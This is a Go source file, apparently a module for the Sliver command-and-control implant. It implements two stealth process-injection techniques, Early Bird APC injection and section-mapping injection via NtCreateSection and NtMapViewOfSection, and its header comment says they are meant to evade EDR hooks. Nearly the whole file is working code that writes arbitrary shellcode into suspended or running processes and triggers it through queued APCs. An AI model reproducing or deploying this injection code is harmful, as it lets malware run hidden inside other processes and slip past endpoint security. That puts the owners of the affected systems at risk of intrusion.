package taskrunner

/*
	Stealth Process Injection Techniques

	Adds alternatives to CreateRemoteThread that evade common EDR hooks:

	1. Early Bird APC Injection - Creates a suspended process, queues an
	   APC to the main thread before it starts, then resumes. The shellcode
	   runs as part of the process initialization, before EDR hooks are set.

	2. NtCreateSection + NtMapViewOfSection - Creates a shared memory section
	   mapped into both the current and target process. Write shellcode to
	   the local mapping (no WriteProcessMemory cross-process call needed),
	   then trigger execution via APC. Avoids VirtualAllocEx + WPM hooks.
*/

import (
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"golang.org/x/sys/windows"
)

// EarlyBirdInject creates a suspended process, writes shellcode into it,
// queues an APC to the main thread, and resumes. The shellcode executes
// during process init — before most EDR userland hooks are installed.
func EarlyBirdInject(processPath string, data []byte, ppid uint32) error {
	// {{if .Config.Debug}}
	log.Printf("[earlybird] spawning %s (suspended)", processPath)
	// {{end}}

	argv, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return err
	}

	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}

	err = windows.CreateProcess(
		nil, argv, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// Allocate RW memory in the suspended process
	dataSize := uintptr(len(data))
	remoteAddr, err := syscalls.VirtualAllocEx(
		pi.Process, 0, dataSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// Write shellcode
	var written uintptr
	err = syscalls.WriteProcessMemory(pi.Process, remoteAddr, &data[0], dataSize, &written)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// Flip to RX
	var oldProtect uint32
	err = syscalls.VirtualProtectEx(pi.Process, remoteAddr, dataSize, windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// Queue APC to the main thread — runs before the process entry point
	err = syscalls.QueueUserAPC(remoteAddr, pi.Thread, 0)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[earlybird] APC queued, resuming thread %d", pi.ThreadId)
	// {{end}}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	return nil
}

// SectionMapInject uses NtCreateSection + NtMapViewOfSection to inject
// shellcode without calling VirtualAllocEx or WriteProcessMemory.
// Creates a shared section, maps it locally (write) and remotely (exec),
// writes shellcode to the local view, then triggers via APC.
func SectionMapInject(pid uint32, data []byte) error {
	// {{if .Config.Debug}}
	log.Printf("[sectionmap] injecting into PID %d", pid)
	// {{end}}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntCreateSection := ntdll.NewProc("NtCreateSection")
	ntMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")

	// Open target process
	processHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ,
		false, pid,
	)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(processHandle)

	// Create section
	var sectionHandle windows.Handle
	sectionSize := int64(len(data))
	r, _, err := ntCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x0F001F, // SECTION_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&sectionSize)),
		windows.PAGE_EXECUTE_READWRITE,
		0x08000000, // SEC_COMMIT
		0,
	)
	if r != 0 {
		return err
	}
	defer windows.CloseHandle(sectionHandle)

	// Map local view (RW) — we write shellcode here
	var localBase uintptr
	var viewSize uintptr
	r, _, err = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		2, // ViewUnmap
		0,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return err
	}

	// Map remote view (RX) — target process executes from here
	var remoteBase uintptr
	r, _, err = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&remoteBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		2,
		0,
		windows.PAGE_EXECUTE_READ,
	)
	if r != 0 {
		return err
	}

	// Copy shellcode to local view (appears in remote view automatically)
	localSlice := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(data))
	copy(localSlice, data)

	// {{if .Config.Debug}}
	log.Printf("[sectionmap] local=0x%x remote=0x%x size=%d", localBase, remoteBase, len(data))
	// {{end}}

	// Find a thread in the target to queue the APC
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(snapshot, &te)
	for err == nil {
		if te.OwnerProcessID == pid {
			threadHandle, e := windows.OpenThread(0x0010, false, te.ThreadID) // THREAD_SET_CONTEXT
			if e == nil {
				syscalls.QueueUserAPC(remoteBase, threadHandle, 0)
				windows.CloseHandle(threadHandle)
				break
			}
		}
		err = windows.Thread32Next(snapshot, &te)
	}

	return nil
}
